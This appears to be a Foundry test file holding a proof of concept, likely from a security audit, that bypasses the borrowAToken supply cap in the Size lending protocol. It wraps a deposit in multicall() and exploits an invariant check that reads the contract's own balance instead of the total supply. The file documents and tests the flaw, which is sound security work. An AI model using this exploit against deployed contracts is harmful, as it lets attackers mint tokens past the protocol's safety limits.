// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {BaseTest} from "@test/BaseTest.sol";

import {Size} from "@src/Size.sol";
import {DepositParams} from "@src/libraries/actions/Deposit.sol";
import {NonTransferrableScaledToken} from "@src/token/NonTransferrableScaledToken.sol";

contract ExploitTest is BaseTest {
    /*
        This PoC demonstrates that the borrowAToken cap and the invariant checked at the end
        of Multicall.multicall() can be bypassed.

        Root cause:
        1. In Multicall.multicall() the library records the Size *contract's* borrowAToken balance
           (balanceOf(address(this))) **instead of the global total supply** before and after the
           batched calls.
        2. When a user deposits underlyingBorrowToken, the newly minted borrowATokens are sent to
           the user address – **NOT** to the Size contract.
        3. Consequently, the contract balance does **not** change even though the **total supply**
           does. The post-multicall invariant that should revert when
             (borrowATokenIncrease > debtTokenDecrease && supplyAfter > cap)
           silently passes because `borrowATokenSupplyAfter == borrowATokenSupplyBefore`.

        Impact:
        An attacker can mint unlimited borrowATokens via multicall, completely ignoring the
        `borrowATokenCap` safety parameter and the intended invariant.

        Test scenario:
        1. The admin reduces `borrowATokenCap` to a very small value (10 USDC) to make the test
           concise.
        2. A normal single `deposit()` that would exceed the cap correctly reverts.
        3. The *same* deposit performed through `multicall()` **succeeds**, proving that the cap and
           invariant are bypassed.
        4. The final borrowAToken total supply is asserted to be larger than the cap.
    */

    function testExploit_BorrowATokenCapBypass() public {
        // 1. Lower the cap so we do not need to move large token amounts
        uint256 newCap = 10e6; // 10 USDC (USDC has 6 decimals in the local environment)
        _updateConfig("borrowATokenCap", newCap);

        // Sanity-check that the cap really changed
        assertEq(size.riskConfig().borrowATokenCap, newCap, "cap not updated");

        // 2. Prepare a deposit that is an order of magnitude larger than the cap
        uint256 amount = 100e6; // 100 USDC
        _mint(address(usdc), alice, amount);
        _approve(alice, address(usdc), address(size), amount);

        // 2.a Attempt the deposit directly – it should revert because it violates the cap
        DepositParams memory params = DepositParams({token: address(usdc), amount: amount, to: alice});
        vm.expectRevert();
        vm.prank(alice);
        size.deposit(params);

        // 3. Encode the same deposit as calldata for multicall
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeCall(Size.deposit, (params));

        // Execute the multicall – **this should succeed** even though it mints over the cap
        vm.prank(alice);
        size.multicall(calls);

        // 4. Verify that the total supply is now greater than the cap, proving the bypass
        NonTransferrableScaledToken borrowAToken = size.data().borrowAToken;
        uint256 totalSupply = borrowAToken.totalSupply();
        assertGt(totalSupply, newCap, "borrowAToken cap was not bypassed");
    }
}
